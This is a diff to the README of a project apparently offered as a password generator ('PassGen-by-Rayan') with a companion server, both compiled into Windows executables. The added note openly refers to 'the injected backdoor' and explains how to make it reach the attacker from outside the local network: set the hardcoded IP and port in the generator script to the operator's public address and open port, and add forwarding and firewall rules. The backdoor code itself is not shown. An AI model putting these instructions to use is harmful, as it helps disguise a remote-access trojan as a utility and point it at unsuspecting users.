@@ -35,6 +35,11 @@ py -m nuitka --mingw64 .\PassGen-by-Rayan-v0.70.py --standalone --onefile --wind
 ```batch
 py -m nuitka --mingw64 .\Server-by-Rayan-v0.30.py --standalone --onefile --windows-icon-from-ico=Server_by_Rayan_x96.ico
 ```
+#### NOTE:
+The injected backdoor communicates inside your network only; to communicate outside your network, do the following:
+- In PassGen-by-Rayan-v0.70.py, line 56, replace '127.1.0.0' with your public ip address, check [whatismyip](https://www.whatismyip.com/)
+- In PassGen-by-Rayan-v0.70.py, line 57, replace '7976' with an open port, test the status of your port at [yougetsignal](https://www.yougetsignal.com/tools/open-ports/). Don't know anything about port forwarding? Google it.
+- You need to create a new rule in your firewall for that port
 ## Acknowledgements
 
  - [def get_pos()](https://stackoverflow.com/a/65530528) & [def move_window()](https://stackoverflow.com/a/65530528) were excerpted from [furas](https://stackoverflow.com/users/1832058/furas).
